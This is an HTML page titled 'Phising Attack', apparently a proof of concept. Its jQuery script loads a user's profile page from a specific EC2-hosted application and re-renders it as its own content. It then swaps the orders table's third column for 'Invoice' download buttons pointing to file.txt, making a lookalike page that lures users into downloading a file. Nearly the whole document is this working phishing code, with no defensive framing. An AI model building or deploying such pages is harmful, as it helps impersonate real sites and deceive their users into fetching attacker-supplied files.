<!DOCTYPE html>
<html lang="en">
  <head>
    <title>Phising Attack</title>
    <!-- jQuery -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.4.1/jquery.min.js"></script>
    <!-- Datatables -->
    <link
      rel="stylesheet"
      type="text/css"
      href="https://cdn.datatables.net/1.11.3/css/jquery.dataTables.css"
    />

    <style>
        .download-btn{
            border:none;
            border-radius: 1em;
            color:white;
            background-color: purple;
            font-weight: 900;
            padding: 1em 3em;

        }
    </style>
    <script
      type="text/javascript"
      charset="utf8"
      src="https://cdn.datatables.net/1.11.3/js/jquery.dataTables.js"
    ></script>
  </head>

  <body>
    <script>
    var html
    $(document).ready(function(){
        $.ajax({
            url: 'http://ec2-3-108-196-161.ap-south-1.compute.amazonaws.com/profile?id=1',
            success:function(data){
                html=data,
                display_html()
            }
        })
    })

    function display_html(){
        $("body").append(html)
        $(".col-lg-4").remove()
        $(".col-lg-8").removeClass().addClass("col-lg-12")

        $("#order_table_th").eq(2).html("Invoice")

        $("#orders_data").find("tr").each(function(){
            var html= `<a href="file.txt">
                <button class="download-btn">Download</button>
                </a>
                `

            $(this).find("td").eq(2).html(html)
        })



    }


    </script>
  </body>
</html>
